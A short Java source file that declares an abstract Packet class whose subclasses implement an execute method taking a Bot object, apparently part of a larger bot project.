package com.redpois0n.packets;

import com.redpois0n.bot.Bot;

public abstract class Packet {
	
	public abstract void execute(Bot bot) throws Exception;

}
